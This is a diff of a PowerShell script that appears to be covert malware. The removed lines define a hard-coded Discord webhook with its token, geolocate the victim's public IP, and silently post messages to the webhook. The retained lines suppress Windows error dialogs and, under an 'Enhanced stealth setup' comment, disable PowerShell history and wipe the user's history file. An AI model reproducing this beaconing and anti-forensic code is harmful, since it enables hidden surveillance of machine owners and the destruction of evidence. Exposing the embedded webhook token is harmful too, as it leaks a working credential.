@@ -17,51 +17,6 @@ $SEM_NOGPFAULTERRORBOX = 0x0002
 $SEM_NOALIGNMENTFAULTEXCEPT = 0x0004
 $SEM_NOOPENFILEERRORBOX = 0x8000
 
-# Discord Webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1381481586528092170/6e8NeeWj03JjQV3Q7o3Wgfgrv5cVe1BtMqHD-rK99pYmWtDGIQ9SAI8tXrDbgn86I8tu"
-
-# Function to get public IP and country code, then convert to Discord flag emoji
-function Get-CountryFlag {
-    try {
-        # Get IP and country data from free API
-        $response = Invoke-RestMethod -Uri "https://ipapi.co/json/" -TimeoutSec 5 -ErrorAction Stop
-        $countryCode = $response.country
-        if (-not $countryCode) { return "" }
-        $flag = ""
-        foreach ($char in $countryCode.ToCharArray()) {
-            $flag += [char](0x1F1E6 + ([byte]([char]::ToUpper($char)) - [byte][char]'A'))
-        }
-        return $flag
-    } catch {
-        # If API fails, return empty string
-        return ""
-    }
-}
-
-# Get country flag once on script start
-$countryFlag = Get-CountryFlag
-
-# Function to get current time UTC formatted string
-function Get-GMTTime {
-    return (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss")
-}
-
-# Function to send message to Discord
-function Send-DiscordMessage {
-    param (
-        [string]$message
-    )
-    $payload = @{
-        content = $message
-    } | ConvertTo-Json -Depth 4
-
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-    } catch {
-        # Failed to send: silently ignore or log locally if needed
-    }
-}
-
 # Enhanced stealth setup
 Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
 Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
